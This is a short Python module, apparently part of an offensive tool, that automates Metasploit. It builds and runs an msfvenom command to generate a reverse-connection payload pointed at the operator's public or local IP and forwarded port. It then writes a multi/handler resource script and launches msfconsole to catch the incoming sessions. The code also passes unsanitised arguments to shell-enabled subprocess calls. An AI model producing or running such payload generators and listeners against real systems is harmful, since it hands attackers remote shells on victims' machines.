from ..format.formatting import coloration
from ..format.formatting import notifications
from ..network.ip import ipAddress

import subprocess

colors = coloration()
notify = notifications()
addrMngr = ipAddress()

class payload:

    def createMSFpayload(self,payload,extension,output,boolean,interf):
        if boolean:
            ip = addrMngr.getPublicIPstring()
        else:
            ip = addrMngr.getLocalip(interf)
        print(f'{notify.notify}{colors.green} Generating MSF {colors.purple}{payload}{colors.green} Payload{colors.end}')
        subprocess.run(f'msfvenom -p {payload} LHOST={ip} LPORT={addrMngr.portForward} -f {extension} -o {output}',shell=True,capture_output=True)
        print(f'{notify.notify}{colors.green} Payload Saved As {colors.purple}{output}{colors.green}. Launching Multi/Handler{colors.end}')

class listener:

    def multiHandler(self,payload,interf):
            with open('listener.rc', 'w') as rcScript:
                rcScript.write('use exploit/multi/handler\n')
                rcScript.write(f'set PAYLOAD {payload}\n')
                rcScript.write(f'set LHOST {addrMngr.getLocalip(interf)}\n')
                rcScript.write(f'set LPORT {addrMngr.portForward}\n')
                rcScript.write('run')
                rcScript.close()
            subprocess.run('gnome-terminal -e "msfconsole -r listener.rc -q"', shell=True, capture_output=True)